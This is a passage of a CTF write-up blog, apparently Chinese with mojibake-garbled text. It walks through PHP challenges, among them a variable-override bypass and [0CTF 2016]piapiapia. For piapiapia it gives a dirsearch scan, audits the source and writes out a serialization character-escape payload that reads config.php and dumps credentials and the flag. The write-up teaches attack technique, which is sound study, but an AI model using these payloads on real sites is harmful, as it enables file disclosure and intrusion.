comment">#è®¾ç½®äº†flagé”®å€¼å³è¿›å…¥</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>$$ å¯¼è‡´çš„å˜é‡è¦†ç›–é—®é¢˜åœ¨CTFä»£ç å®¡è®¡é¢˜ç›®ä¸­ç»å¸¸åœ¨foreachä¸­å‡ºç°ã€‚</p><p>ä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚</p><p>å› æ­¤å°±äº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´ã€‚è¯·æ±‚?name=test ä¼šå°†$nameçš„å€¼è¦†ç›–ï¼Œå˜ä¸ºtestã€‚</p><p>å› ä¸ºæœ€åä¸€å¥è¯è¡¨æ˜ç¡®ç¡®å®å®å­˜åœ¨$flagï¼Œæ‰€ä»¥åˆ©ç”¨å˜é‡è¦†ç›–å°†exitä¸­çš„ä»»ä½•ä¸€ä¸ªå˜é‡å˜ä¸º$flagå³å¯å®ç°flagçš„è¾“å‡ºï¼Œæ‰€ä»¥è¿™é‡Œç”¨ä¸‰ç§è¦†ç›–çš„é€‰æ‹©ï¼š</p><h3 id="ç¬¬ä¸€ç§è¦†ç›–-handsomeï¼š"><a href="#ç¬¬ä¸€ç§è¦†ç›–-handsomeï¼š" class="headerlink" title="ç¬¬ä¸€ç§è¦†ç›–$handsomeï¼š"></a>ç¬¬ä¸€ç§è¦†ç›–$handsomeï¼š</h3><p>å› ä¸ºæ¡ä»¶çŸ›ç›¾ï¼Œè¦æ±‚æˆ‘keyå€¼ä¸ºflagï¼Œè¿˜è¦æ±‚æˆ‘keyå€¼ä¸èƒ½ä¸ºflagã€‚</p><p>å°†é”®å€¼å˜æˆä¸º$handsome=flagåˆ©ç”¨getçš„è¦†ç›–å˜é‡åå˜æˆ$handsome=$flagï¼Œæ­¤æ—¶$handsomeçš„å€¼å·²ç»å˜æˆäº†æˆ‘ä»¬éœ€è¦çš„flagï¼Œç„¶åflag=handsomeå†æ¥ä¸€æ¬¡è¦†ç›–è¿™æ ·$handsomeçš„å˜é‡å€¼ä¸ºflagçš„å€¼åŒæ—¶$flagä¹Ÿæ˜¯flagï¼ŒåŒæ—¶ä¹Ÿæ»¡è¶³äº†keyå€¼ä¼ å…¥çš„keyå€¼ä¸ºflag çš„valueç­‰äºhandsomeï¼ŒåŒæ—¶ï¼Œè€Œä¼ å…¥çš„keyå€¼ä¸ºhandsome çš„ä¹Ÿç­‰äºflagä¹Ÿå°±å®ç°äº†ç»•è¿‡~</p><h3 id="ç¬¬äºŒç§è¦†ç›–-ydsï¼š"><a href="#ç¬¬äºŒç§è¦†ç›–-ydsï¼š" class="headerlink" title="ç¬¬äºŒç§è¦†ç›–$ydsï¼š"></a>ç¬¬äºŒç§è¦†ç›–$ydsï¼š</h3><p>ä¸è®ºæ˜¯getè¿˜æ˜¯postä¼ å‚keyå€¼éƒ½ä¸èƒ½ä¸ºflagï¼Œè¿™æ˜¯å¯ä»¥å‡ºç°è¿™ç§å½¢å¼ï¼š$yds=$flagï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨æ‰€è¯´çš„å˜é‡è¦†ç›–ï¼Œæ¥å®ç°$flagçš„è°ƒç”¨</p><h3 id="ç¬¬ä¸‰ç§è¦†ç›–-isï¼š"><a href="#ç¬¬ä¸‰ç§è¦†ç›–-isï¼š" class="headerlink" title="ç¬¬ä¸‰ç§è¦†ç›–$isï¼š"></a>ç¬¬ä¸‰ç§è¦†ç›–$isï¼š</h3><p>è¦æ±‚postä¼ å…¥çš„keyå€¼ä¸ºflagæˆ–è€…getä¼ å…¥çš„keyå€¼ä¸ºflagã€‚æ‰€ä»¥åˆ©ç”¨getè¿›è¡Œè¦†ç›–ï¼šflag=flag&amp;is=flagï¼Œåˆ©ç”¨$flagæŠŠ$isç»™è¦†ç›–</p><p>è€Œæ­¤é¢˜ä¸»è¦åˆ©ç”¨çš„è¦†ç›–ç‚¹åœ¨äº$$x=$$y</p><h1 id="2021-05-31"><a href="#2021-05-31" class="headerlink" title="2021-05-31"></a>2021-05-31</h1><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>æ‰«ç›²ï¼š</p><p><a href="https://www.runoob.com/php/func-string-implode.html" target="_blank" rel="noopener">PHP implode() å‡½æ•°</a>ï¼šå°†æ•°ç»„ä¸­çš„å†…å®¹ï¼Œç”¨å‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªå€¼æ¥åˆ†å‰²å¼€</p><p>1.dirsearchæ‰«æå¾—åˆ°<a href="http://www.zipæ–‡ä»¶" target="_blank" rel="noopener">www.zipæ–‡ä»¶</a></p><pre><code>python3 dirsearch.py -u &quot;http://af94cb62-af25-4728-b6bf-3f1c475f72a4.node3.buuoj.cn/&quot; -e * -s 1</code></pre><p>2.åˆ©ç”¨ä»£ç å®¡è®¡å·¥å…·æ‰«ä¸€ä¸‹å‘ç°åœ¨profile.phpä¸­å­˜åœ¨æ–‡ä»¶è¯»å–</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php    require_once('class.php');    if($_SESSION['username'] == null) {        die('Login First');        }    $username = $_SESSION['username'];    $profile=$user->show_profile($username);    if($profile  == null) {        header('Location: update.php');    }    else {        $profile = unserialize($profile); //ååºåˆ—åŒ–æ¼æ´        $phone = $profile['phone'];        $email = $profile['email'];        $nickname = $profile['nickname'];        $photo = base64_encode(file_get_contents($profile['photo'])); //æ–‡ä»¶è¯»å–?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯$photoè¿™ä¸ªåœ°æ–¹å­˜åœ¨æ–‡ä»¶è¯»å–</p><p>åŒæ—¶ç»è¿‡å®¡è®¡ä¹Ÿå­˜åœ¨ååºåˆ—åŒ–åœ¨ç¬¬12è¡Œ</p><p>3.è¯´updata.phpä¸­å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯ç»è¿‡åˆ†ææ–‡ä»¶ä¸Šä¼ åå­—ç»è¿‡md5åŠ å¯†ï¼Œä¸”ä¸Šä¼ æˆåŠŸåä¸è¿”å›åŠ å¯†ä¿¡æ¯</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php    require_once('class.php');    if($_SESSION['username'] == null) {        die('Login First');        }    if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {        $username = $_SESSION['username'];        if(!preg_match('/^\d{11}$/', $_POST['phone']))            die('Invalid phone');        if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))            die('Invalid email');        if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)            die('Invalid nickname');        $file = $_FILES['photo'];        if($file['size'] < 5 or $file['size'] > 1000000)            die('Photo size error');        move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));        $profile['phone'] = $_POST['phone'];        $profile['email'] = $_POST['email'];        $profile['nickname'] = $_POST['nickname'];        $profile['photo'] = 'upload/' . md5($file['name']);//æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶è¯»å–çš„åˆ©ç”¨ç‚¹        $user->update_profile($username, serialize($profile));//å‡ºç°åºåˆ—åŒ–ï¼ŒåŒæ—¶éœ€è¦åˆ©ç”¨update_profileå‡½æ•°        echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';    }    else {?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.è·Ÿè¸ªupdate_profileå‡½æ•°</p><p>parent::è°ƒç”¨çˆ¶ç±»æ–¹æ³•(æ„é€ å‡½æ•°)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//è·Ÿè¿›update_profileå‡½æ•°</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//è·Ÿè¿›filterå‡½æ•°</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.config.phpä¸­æœ‰flagå˜é‡(ä½†æ˜¯è¿™åªæ˜¯æœ¬åœ°ä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯çš„ï¼Œè€ŒçœŸæ­£çš„flagå­˜åœ¨äºæœåŠ¡ç«¯çš„config.phpæ–‡ä»¶ä¸­)ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ€è·¯æœ‰äº†ï¼šåˆ©ç”¨profile.phpä¸­å­˜åœ¨çš„æ–‡ä»¶è¯»å–å‡½æ•°ï¼ˆfile_get_contentsï¼‰æ¥å®ç°config.phpçš„æ‰“å°ï¼Œè€Œè¿™é‡Œåªæ˜¯å°†profile[â€˜phpotoâ€™]æ¥è¿›è¡Œè¾“å‡ºï¼Œè€Œ$profileä¼šè¢«ä½œä¸ºæ•°ç»„æ¥å…ˆååºåˆ—åŒ–ï¼Œç„¶åå†è¿›è¡Œä¸‹é¢çš„èµ‹å€¼æ“ä½œï¼Œæ‰€ä»¥å°±éœ€è¦æˆ‘ä»¬å°†è¦è¯»çš„æ–‡ä»¶æ”¾åœ¨æ•°ç»„$profileä¸­çš„photoçš„ä½ç½®ï¼Œå½“è¿™æ®µä»£ç :$photo = base64_encode(file_get_contents($profile[â€˜photoâ€™]));è¢«æ‰§è¡Œåï¼Œåœ¨å‰ç«¯å°±ä¼šå‡ºç°æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯äº†ï¼Œä½†æ˜¯å¦‚ä½•ä¼ å…¥åºåˆ—åŒ–çš„å€¼è€Œä¸è¢«è¿‡æ»¤ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>é¦–å…ˆè¦çŸ¥é“profileæ˜¯ä½œä¸ºæ•°ç»„æ¥è¿›è¡Œååºåˆ—åŒ–çš„ï¼Œè€Œè¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªå«åš<a href="https://www.cnblogs.com/litlife/p/11690918.html#0x02-0ctf-2016-piapiapia" target="_blank" rel="noopener">PHPåºåˆ—åŒ–é•¿åº¦å˜åŒ–å¯¼è‡´å°¾éƒ¨å­—ç¬¦é€ƒé€¸</a>ï¼Œä¹Ÿå°±æ˜¯åœ¨æ•°ç»„ä¸­ï¼Œåˆ©ç”¨é—­åˆçš„ä¸­æ‹¬å·çš„ç‰¹ç‚¹æ¥å®ç°è‡ªå®šä¹‰ç»“æŸååºåˆ—åŒ–æ“ä½œï¼ŒåŒæ—¶å°†åºåˆ—åŒ–åé¢çš„å­—ç¬¦æŒ¤å…¥åˆ°æ•°ç»„çš„ä¸‹ä¸€ä¸ªå‚æ•°å½“ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹ç°åœ¨çš„profileä¸­æ•°ç»„ç»è¿‡ååºåˆ—åŒ–åçš„æ ·å­ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'17616150330'</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'yyk@qq.com'</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶è¯»å–çš„åˆ©ç”¨ç‚¹</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°ï¼š</p><p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;17616150330&quot;;s:5:&quot;email&quot;;s:10:&quot;yyk@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;yn8rt&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></p><p>åŒæ—¶è§£å†³å­—ç¬¦å—é™åˆ¶å‡½æ•°strlen()çš„å½±å“ï¼šåˆ©ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡</p><p>ç„¶åæ¥ä¸‹æ¥çš„æ“ä½œå°±æ˜¯åˆ©ç”¨æº¢å‡ºæ¥çš„å­—ç¬¦å®ç°æ•°ç»„ä¸­çš„photoçš„å€¼ä¸ºç”¨æˆ·å¯æ§: </p><p><code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>ä¸€å…±34ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘å°±éœ€è¦é¢å¤–çš„34çš„å­—ç¬¦æ¥æ›¿ä»£è¿™åé¢çš„è‡ªå®šä¹‰åºåˆ—åŒ–å­—ç¬¦ï¼Œé¦–å…ˆä¸è®ºä½ è¾“å…¥å¤šå°‘å­—ç¬¦ä¸²éƒ½æ²¡æ³•è®©ååºåˆ—åŒ–æŠ¥é”™ï¼Œå› ä¸ºsçš„å€¼æ˜¯å…ˆåˆ¤æ–­çš„ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥è®©å…¶å…ˆåˆ¤æ–­åæ”¹å˜ï¼Œä¹Ÿå°±æ˜¯åˆ©ç”¨filterå‡½æ•°ï¼Œåˆ©ç”¨whereå˜æˆhackerå¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­æŠ¥é”™ï¼Œè®©ä»–å¤šå‡º34ä¸ªå­—ç¬¦æ¥æ›¿ä»£æˆ‘ä»¬çš„æ”»å‡»payloadï¼Œè®©æˆ‘ä»¬çš„æ”»å‡»payloadæˆåŠŸä¼ªé€ ï¼Œå°†çœŸæ­£çš„photoçš„å€¼ç»™æˆåŠŸæ›¿ä»£ï¼š</p><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"17616150330"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"yyk@qq.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">204</span><span class="token punctuation">:</span><span class="token string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";}s:5:"</span>photo<span class="token string">";s:39:"</span>upload<span class="token operator">/</span>d41d8cd98f00b204e9800998ecf8427e"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"17616150330"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"yyk@qq.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">238</span><span class="token punctuation">:</span><span class="token string">"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";}s:5:"</span>photo<span class="token string">";s:39:"</span>upload<span class="token operator">/</span>d41d8cd98f00b204e9800998ecf8427e"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ ·åé¢åœ¨æ•°ç»„ä¸­çš„photoçš„ä½ç½®å°±è¢«æ›¿æ¢ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼äº†ï¼Œç„¶åè¯»å–configæ–‡ä»¶ä¸­çš„flagå°±å¯ä»¥äº†</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token number">9</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'qwertyuiop'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'challenges'</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag{b1f24b3e-d20d-4f65-806a-06c29b1969ca}'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-06-01"><a href="#2021-06-01" class="headerlink" title="2021-06-01"></a>2021-06-01</h1><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>åšè¿™ä¸ªé¢˜çš„æ—¶å€™æ˜¯ä¸çŸ¥é“ç¦æ­¢å¥—å¨ƒæ˜¯ä»€ä¹ˆæ„æ€çš„ï¼Œç­‰å®Œå…¨ç†è§£<a href="https://zhidao.baidu.com/question/1696866624128831108.html" target="_blank" rel="noopener"><code>((?R)?\)\)</code></a>äº†è¿™ä¸ªæ­£åˆ™åŒ¹é…è¡¨è¾¾å¼ä»¥åå°±å¯ä»¥æ˜ç™½ï¼Œæ‰€è°“çš„å¥—å¨ƒå°±æ˜¯ä»€ä¹ˆ </p><h3 id="è€ƒç‚¹ï¼š-1"><a href="#è€ƒç‚¹ï¼š-1" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h3><p>æ— å‚æ•°rce</p><p>ä¿¡æ¯æ³„éœ²</p><p>åˆ©ç”¨dirsearchå¼€å»¶æ—¶ï¼Œä¼šæ‰«å‡ºæ¥.gitç›¸å…³çš„æ³„éœ²ï¼Œåˆ©ç”¨githackå°†æºç downä¸‹æ¥</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token 